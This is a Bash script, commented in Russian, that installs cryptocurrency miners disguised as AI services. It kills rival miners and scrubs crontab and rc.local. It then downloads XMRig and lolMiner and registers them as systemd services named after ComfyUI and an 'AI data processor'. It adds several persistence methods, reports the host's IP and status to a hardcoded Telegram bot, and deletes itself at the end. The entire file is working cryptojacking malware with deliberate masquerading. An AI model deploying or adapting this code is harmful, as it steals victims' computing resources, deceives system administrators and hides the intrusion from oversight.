#!/bin/bash

#==============================================================================
# БЛОК КОНФИГУРАЦИИ (ЛЕГЕНДА: AI/ML СЕРВЕР) я нищий
#==============================================================================
KRYPTEX_IDENTIFIER="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
GPU_POOL="etc.kryptex.network:7033"
CPU_POOL="xmr.kryptex.network:7029"

HOSTNAME_VAR=$(hostname 2>/dev/null || echo "unknownhost")
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRYPTEX_IDENTIFIER}.${WORKER_ID}"

#==============================================================================
# ГЛОБАЛЬНЫЕ СИСТЕМНЫЕ ПЕРЕМЕННЫЕ (ПОД МАСКИРОВКОЙ)
#==============================================================================
BASE_DIR="/opt/system-daemons"
# --- МАСКИРОВКА GPU ---
GPU_SERVICE_NAME="comfy-ui-service"
GPU_DIR="$BASE_DIR/comfyui"
GPU_LOG_FILE="/var/log/comfyui.log"
GPU_SCRIPT_NAME="start_comfy.sh"
# --- МАСКИРОВКА CPU ---
CPU_SERVICE_NAME="ai-data-processor"
CPU_DIR="$BASE_DIR/ai-data"
CPU_LOG_FILE="/var/log/ai-data.log"

#==============================================================================
# ФУНКЦИЯ ТРАНСЛИТЕРАЦИИ И ВЫВОДА В КОНСОЛЬ
#==============================================================================
echo_t() {
    local text="$1"
    local translit_text=$(echo "$text" | sed \
        -e 's/а/a/g; s/б/b/g; s/в/v/g; s/г/g/g; s/д/d/g; s/е/e/g; s/ё/yo/g; s/ж/zh/g; s/з/z/g; s/и/i/g; s/й/y/g; s/к/k/g; s/л/l/g; s/м/m/g; s/н/n/g; s/о/o/g; s/п/p/g; s/р/r/g; s/с/s/g; s/т/t/g; s/у/u/g; s/ф/f/g; s/х/kh/g; s/ц/ts/g; s/ч/ch/g; s/ш/sh/g; s/щ/shch/g; s/ъ//g; s/ы/y/g; s/ь//g; s/э/e/g; s/ю/yu/g; s/я/ya/g' \
        -e 's/А/A/g; s/Б/B/g; s/В/V/g; s/Г/G/g; s/Д/D/g; s/Е/E/g; s/Ё/Yo/g; s/Ж/Zh/g; s/З/Z/g; s/И/I/g; s/Й/Y/g; s/К/K/g; s/Л/L/g; s/М/M/g; s/Н/N/g; s/О/O/g; s/П/P/g; s/Р/R/g; s/С/S/g; s/Т/T/g; s/У/U/g; s/Ф/F/g; s/Х/Kh/g; s/Ц/Ts/g; s/Ч/Ch/g; s/Ш/Sh/g; s/Щ/Shch/g; s/Ъ//g; s/Ы/Y/g; s/Ь//g; s/Э/E/g; s/Ю/Yu/g; s/Я/Ya/g'
    )
    echo "$translit_text"
}

#==============================================================================
# ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЙ В TELEGRAM
#==============================================================================
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TELEGRAM_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="HTML" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uvedomlenie otpravleno v Telegram"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Oshibka otpravki uvedomleniya v Telegram"
    fi
}

#==============================================================================
# ФУНКЦИЯ ОЧИСТКИ ОКРУЖЕНИЯ (УПРОЩЕННАЯ ВЕРСИЯ)
#==============================================================================
ensure_clean_environment() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo uproshchennoy ochistki okruzheniya..."
    local killed_count=0
    local removed_lines=0
    
    # --- УДАЛЕНИЕ ТОЛЬКО XMRIG (БЕЗ ДРУГИХ ПРОЦЕССОВ) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk i zavershenie protsessa xmrig..."
    if pgrep -f "xmrig" > /dev/null 2>&1; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen protsess: xmrig"
        pkill -9 -f "xmrig" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess xmrig zavershen"
            ((killed_count++))
        fi
        sleep 1
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess xmrig ne nayden"
    fi

    # --- ОЧИСТКА АВТОЗАПУСКА ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka crontab..."
    local cron_temp=$(mktemp)
    crontab -l > "$cron_temp" 2>/dev/null
    
    if [ -s "$cron_temp" ]; then
        local original_lines=$(wc -l < "$cron_temp")
        grep -v -E "(curl|wget|miner|xmr|stratum|pool)" "$cron_temp" > "${cron_temp}.clean"
        local cleaned_lines=$(wc -l < "${cron_temp}.clean")
        removed_lines=$((original_lines - cleaned_lines))
        
        if [ $removed_lines -gt 0 ]; then
            crontab "${cron_temp}.clean"
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udaleno $removed_lines zapisey iz crontab"
        else
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Podozritel'nykh zapisey v crontab ne naydeno"
        fi
        rm -f "${cron_temp}.clean"
    fi
    rm -f "$cron_temp"

    if [ -f /etc/rc.local ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka /etc/rc.local..."
        sed -i '/curl\|wget\|miner\|xmr/d' /etc/rc.local 2>/dev/null
    fi

    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk podozritel'nykh systemd sluzhb..."
    for service in $(systemctl list-units --type=service --all 2>/dev/null | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhena podozritel'naya sluzhba: $service"
        systemctl stop "$service" 2>/dev/null
        systemctl disable "$service" 2>/dev/null
        rm -f "/etc/systemd/system/$service" 2>/dev/null
    done

    # --- ОЧИСТКА ВРЕМЕННЫХ ФАЙЛОВ ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie vremennykh faylov..."
    local temp_patterns=("/tmp/*miner*" "/tmp/*xmr*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*" "/var/tmp/*miner*" "/var/tmp/*xmr*" "/dev/shm/*miner*")
    for pattern in "${temp_patterns[@]}"; do
        rm -rf $pattern 2>/dev/null
    done
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uproshchennaya ochistka zavershena. Zaversheno protsessov: $killed_count, udaleno zapisey: $removed_lines"
    
    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then
        send_telegram_notification "🧹 <b>Ochistka okruzheniya na ${HOSTNAME_VAR}</b>

Zaversheno protsessov: $killed_count
Udaleno cron zapisey: $removed_lines
IP: ${SERVER_IP}"
    fi
}

#==============================================================================
# ФУНКЦИЯ УСТАНОВКИ AI-МОДУЛЕЙ (МАСКИРОВКА)
#==============================================================================
install_compute_modules() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo ustanovki AI-moduley..."
    
    # Создание директорий
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie direktoriy..."
    mkdir -p "$GPU_DIR" "$CPU_DIR"
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' direktorii"
        send_telegram_notification "❌ Oshibka sozdaniya direktoriy na ${HOSTNAME_VAR}"
        return 1
    fi
    
    # ========== УСТАНОВКА lolMiner для GPU (ETC) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skachivanie lolMiner dlya ComfyUI (GPU)..."
    cd "$GPU_DIR"
    
    local lolminer_url="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz"
    local lolminer_archive="lolMiner.tar.gz"
    
    if wget -q -O "$lolminer_archive" "$lolminer_url" 2>/dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] lolMiner skachan uspeshno"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' skachat' lolMiner"
        send_telegram_notification "❌ Oshibka skachivaniya GPU-modulya (lolMiner) na ${HOSTNAME_VAR}"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Raspakovka lolMiner..."
    tar -xzf "$lolminer_archive" --strip-components=1 2>/dev/null
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' raspakovat' lolMiner"
        return 1
    fi
    rm -f "$lolminer_archive"
    
    # Создание стартового скрипта для lolMiner
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie startovogo skripta lolMiner..."
    cat > "$GPU_DIR/$GPU_SCRIPT_NAME" <<EOF
#!/bin/bash
cd $GPU_DIR
./lolMiner --algo ETCHASH --pool ${GPU_POOL} --user ${WORKER_NAME} --tls off --nocolor
EOF
    
    chmod +x "$GPU_DIR/$GPU_SCRIPT_NAME"
    chmod +x "$GPU_DIR/lolMiner" 2>/dev/null
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] GPU-modul' (lolMiner) ustanovlen: $GPU_DIR/$GPU_SCRIPT_NAME"
    
    # ========== УСТАНОВКА XMRig для CPU ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skachivanie XMRig dlya AI Data Processor (CPU)..."
    cd "$CPU_DIR"
    
    local cpu_url="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
    local cpu_archive="xmrig.tar.gz"
    
    if wget -q -O "$cpu_archive" "$cpu_url" 2>/dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] XMRig skachan uspeshno"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' skachat' XMRig"
        send_telegram_notification "❌ Oshibka skachivaniya CPU-modulya (XMRig) na ${HOSTNAME_VAR}"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Raspakovka XMRig..."
    tar -xzf "$cpu_archive" --strip-components=1 2>/dev/null
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' raspakovat' XMRig"
        return 1
    fi
    
    local cpu_binary=$(find "$CPU_DIR" -type f -name "xmrig" | head -n 1)
    if [ -n "$cpu_binary" ]; then
        mv "$cpu_binary" "$CPU_DIR/$CPU_SERVICE_NAME"
        chmod +x "$CPU_DIR/$CPU_SERVICE_NAME"
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] CPU-modul' (XMRig) ustanovlen: $CPU_DIR/$CPU_SERVICE_NAME"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne nayden ispolnyaemyy fayl XMRig"
    fi
    rm -f "$cpu_archive"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka AI-moduley zavershena"
    send_telegram_notification "✅ AI-moduli ustanovleny na ${HOSTNAME_VAR}

GPU: lolMiner (ETCHASH)
CPU: XMRig (Monero)"
    
    return 0
}

#==============================================================================
# ФУНКЦИЯ СОЗДАНИЯ SYSTEMD СЛУЖБ (МАСКИРОВКА)
#==============================================================================
create_systemd_services() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie systemd sluzhb..."
    
    # ========== GPU Служба (lolMiner) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie sluzhby $GPU_SERVICE_NAME..."
    cat > "/etc/systemd/system/${GPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=ComfyUI AI Image Generation Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash ${GPU_DIR}/${GPU_SCRIPT_NAME}
Restart=always
RestartSec=10
StandardOutput=append:${GPU_LOG_FILE}
StandardError=append:${GPU_LOG_FILE}
WorkingDirectory=${GPU_DIR}
User=root

[Install]
WantedBy=multi-user.target
EOF

    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' sluzhbu $GPU_SERVICE_NAME"
        send_telegram_notification "❌ Oshibka sozdaniya GPU sluzhby na ${HOSTNAME_VAR}"
        return 1
    fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba $GPU_SERVICE_NAME sozdana"
    
    # ========== CPU Служба (XMRig) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie sluzhby $CPU_SERVICE_NAME..."
    cat > "/etc/systemd/system/${CPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=AI Data Processing Service
After=network.target

[Service]
Type=simple
ExecStart=${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x
Restart=always
RestartSec=10
StandardOutput=append:${CPU_LOG_FILE}
StandardError=append:${CPU_LOG_FILE}
WorkingDirectory=${CPU_DIR}
User=root

[Install]
WantedBy=multi-user.target
EOF

    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' sluzhbu $CPU_SERVICE_NAME"
        send_telegram_notification "❌ Oshibka sozdaniya CPU sluzhby na ${HOSTNAME_VAR}"
        return 1
    fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba $CPU_SERVICE_NAME sozdana"
    
    # Перезагрузка systemd
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd daemon..."
    systemctl daemon-reload
    
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' perezagruzit' systemd daemon"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd sluzhby uspeshno sozdany"
    send_telegram_notification "✅ Systemd sluzhby sozdany na ${HOSTNAME_VAR}"
    
    return 0
}

#==============================================================================
# ФУНКЦИЯ ДОБАВЛЕНИЯ В АВТОЗАПУСК
#==============================================================================
setup_autostart() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nastroyka avtozapuska sluzhb..."
    
    # Systemd enable
    systemctl enable "${GPU_SERVICE_NAME}" 2>/dev/null
    systemctl enable "${CPU_SERVICE_NAME}" 2>/dev/null
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd avtozapusk nastroen"
    
    # Cron @reboot
    (crontab -l 2>/dev/null | grep -v "${GPU_SERVICE_NAME}\|${CPU_SERVICE_NAME}"; \
     echo "@reboot systemctl start ${GPU_SERVICE_NAME}"; \
     echo "@reboot systemctl start ${CPU_SERVICE_NAME}") | crontab - 2>/dev/null
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Cron @reboot nastroen"
    
    # rc.local
    if [ -f /etc/rc.local ]; then
        grep -q "${GPU_SERVICE_NAME}" /etc/rc.local || echo "systemctl start ${GPU_SERVICE_NAME}" >> /etc/rc.local
        grep -q "${CPU_SERVICE_NAME}" /etc/rc.local || echo "systemctl start ${CPU_SERVICE_NAME}" >> /etc/rc.local
        chmod +x /etc/rc.local
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] rc.local nastroen"
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Mnozhestvennye metody avtozapuska nastroeny"
}

#==============================================================================
# ФУНКЦИЯ СОЗДАНИЯ ИНСТРУМЕНТОВ УПРАВЛЕНИЯ (МАСКИРОВКА)
#==============================================================================
create_management_tools() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie instrumentov upravleniya..."
    
    # ========== start-ai ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie skripta start-ai..."
    cat > "/usr/local/bin/start-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Zapusk AI sluzhb..."

systemctl start "\${GPU_SERVICE_NAME}"
if [ \$? -eq 0 ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${GPU_SERVICE_NAME} zapushchena"
else
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' zapustit' \${GPU_SERVICE_NAME}"
fi

systemctl start "\${CPU_SERVICE_NAME}"
if [ \$? -eq 0 ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${CPU_SERVICE_NAME} zapushchena"
else
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' zapustit' \${CPU_SERVICE_NAME}"
fi

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Zapusk sluzhb zavershen"
EOF
    chmod +x "/usr/local/bin/start-ai"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skript start-ai sozdan"
    
    # ========== stop-ai ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie skripta stop-ai..."
    cat > "/usr/local/bin/stop-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka AI sluzhb..."

systemctl stop "\${GPU_SERVICE_NAME}"
if [ \$? -eq 0 ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${GPU_SERVICE_NAME} ostanovlena"
else
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' ostanovit' \${GPU_SERVICE_NAME}"
fi

systemctl stop "\${CPU_SERVICE_NAME}"
if [ \$? -eq 0 ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${CPU_SERVICE_NAME} ostanovlena"
else
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' ostanovit' \${CPU_SERVICE_NAME}"
fi

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka sluzhb zavershena"
EOF
    chmod +x "/usr/local/bin/stop-ai"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skript stop-ai sozdan"
    
    # ========== status-ai ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie skripta status-ai..."
    cat > "/usr/local/bin/status-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"
GPU_LOG_FILE="${GPU_LOG_FILE}"
CPU_LOG_FILE="${CPU_LOG_FILE}"
TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID}"

send_telegram_notification() {
    local message="\$1"
    curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d chat_id="\${TELEGRAM_CHAT_ID}" \
        -d text="\${message}" \
        -d parse_mode="HTML" > /dev/null 2>&1
}

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Proverka statusa AI sluzhb..."

gpu_status=\$(systemctl is-active "\${GPU_SERVICE_NAME}")
cpu_status=\$(systemctl is-active "\${CPU_SERVICE_NAME}")

gpu_logs=""
if [ -f "\${GPU_LOG_FILE}" ]; then
    gpu_logs=\$(tail -n 5 "\${GPU_LOG_FILE}" 2>/dev/null)
fi

cpu_logs=""
if [ -f "\${CPU_LOG_FILE}" ]; then
    cpu_logs=\$(tail -n 5 "\${CPU_LOG_FILE}" 2>/dev/null)
fi

message="📊 <b>Status AI-sluzhb na \$(hostname)</b>

🎨 <b>ComfyUI Service (\${GPU_SERVICE_NAME}):</b>
Status: \${gpu_status}

📝 Poslednie 5 strok loga:
<code>\${gpu_logs:-Log pust ili nedostupen}</code>

⚙️ <b>AI Data Processor (\${CPU_SERVICE_NAME}):</b>
Status: \${cpu_status}

📝 Poslednie 5 strok loga:
<code>\${cpu_logs:-Log pust ili nedostupen}</code>"

echo "=== ComfyUI Service (\${GPU_SERVICE_NAME}) Status ==="
systemctl status "\${GPU_SERVICE_NAME}" --no-pager -l 2>&1 | head -n 10
echo ""
echo "=== ComfyUI Last 5 Log Lines ==="
echo "\${gpu_logs:-Log pust ili nedostupen}"
echo ""
echo "=== AI Data Processor (\${CPU_SERVICE_NAME}) Status ==="
systemctl status "\${CPU_SERVICE_NAME}" --no-pager -l 2>&1 | head -n 10
echo ""
echo "=== AI Data Processor Last 5 Log Lines ==="
echo "\${cpu_logs:-Log pust ili nedostupen}"

send_telegram_notification "\${message}"
echo ""
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Status otpravlen v Telegram"
EOF
    chmod +x "/usr/local/bin/status-ai"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skript status-ai sozdan"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Vse instrumenty upravleniya sozdany"
    send_telegram_notification "✅ Instrumenty upravleniya AI sozdany na ${HOSTNAME_VAR}

Komandy: start-ai, stop-ai, status-ai"
    
    return 0
}

#==============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
#==============================================================================
main() {
    echo_t "======================================================================="
    echo_t "  Sistemnyy skript dlya upravleniya AI-servisami"
    echo_t "  Zapushchen: $(date '+%Y-%m-%d %H:%M:%S')"
    echo_t "  Khost: ${HOSTNAME_VAR}"
    echo_t "======================================================================="
    echo ""
    
    # Проверка root
    if [ "$EUID" -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Skript dolzhen byt' zapushchen s pravami root"
        echo_t "Pozhaluysta, zapustite skript s sudo ili ot pol'zovatelya root"
        exit 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Proverka prav root proydena"
    echo ""
    
    # Уведомление о начале
    send_telegram_notification "🚀 <b>Nachalo razvertyvaniya AI-infrastruktury</b>

Khost: ${HOSTNAME_VAR}
IP: ${SERVER_IP}
Worker ID: ${WORKER_NAME}
Vremya: $(date '+%Y-%m-%d %H:%M:%S')"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uvedomlenie o nachale raboty otpravleno"
    echo ""
    
    # Очистка окружения
    ensure_clean_environment
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka ochistki okruzheniya</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Установка модулей
    install_compute_modules
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka ustanovki AI-moduley</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Создание служб
    create_systemd_services
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka sozdaniya AI-sluzhb</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Создание инструментов
    create_management_tools
    if [ $? -ne 0 ]; then
        send_telegram_notification "❌ <b>Oshibka sozdaniya instrumentov</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # Активация служб
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd i aktivatsiya sluzhb..."
    systemctl daemon-reload
    
    systemctl enable --now "${GPU_SERVICE_NAME}"
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Oshibka aktivatsii ${GPU_SERVICE_NAME}"
    fi
    
    systemctl enable --now "${CPU_SERVICE_NAME}"
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Oshibka aktivatsii ${CPU_SERVICE_NAME}"
    fi
    echo ""
    
    # Настройка автозапуска
    setup_autostart
    echo ""
    
    # Проверка статуса
    sleep 3
    gpu_status=$(systemctl is-active "${GPU_SERVICE_NAME}")
    cpu_status=$(systemctl is-active "${CPU_SERVICE_NAME}")
    
    # Финальное уведомление
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Otpravka final'nogo uvedomleniya..."
    send_telegram_notification "✅ <b>AI-infrastruktura uspeshno razvernuta!</b>

🖥️ Khost: ${HOSTNAME_VAR}
🌐 IP: ${SERVER_IP}
🔑 Worker ID: ${WORKER_NAME}
⏰ Vremya zaversheniya: $(date '+%Y-%m-%d %H:%M:%S')

📊 <b>Status sluzhb:</b>
🎨 ComfyUI (lolMiner/ETCHASH): ${gpu_status}
⚙️ AI Data Processor (XMRig/Monero): ${cpu_status}

📁 <b>Ustanovlennye komponenty:</b>
• GPU modul': ${GPU_DIR}/${GPU_SCRIPT_NAME}
• CPU modul': ${CPU_DIR}/${CPU_SERVICE_NAME}
• Instrumenty: start-ai, stop-ai, status-ai

📝 <b>Logi:</b>
• GPU: ${GPU_LOG_FILE}
• CPU: ${CPU_LOG_FILE}

🎯 Ispol'zuyte komandu <code>status-ai</code> dlya proverki raboty"
    
    echo ""
    echo_t "======================================================================="
    echo_t "  ✓ AI-INFRASTRUKTURA USPESHNO RAZVERNUTA"
    echo_t "  Zaversheno: $(date '+%Y-%m-%d %H:%M:%S')"
    echo_t "======================================================================="
    echo ""
    echo_t "Dostupnye komandy:"
    echo_t "  start-ai   - Zapusk AI sluzhb"
    echo_t "  stop-ai    - Ostanovka AI sluzhb"
    echo_t "  status-ai  - Proverka statusa AI sluzhb"
    echo ""
    
    # Самоуничтожение скрипта
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie skripta..."
    sleep 2
    rm -f -- "$0"
    
    exit 0
}

#==============================================================================
# ЗАПУСК ГЛАВНОЙ ФУНКЦИИ
#==============================================================================
main "$@"
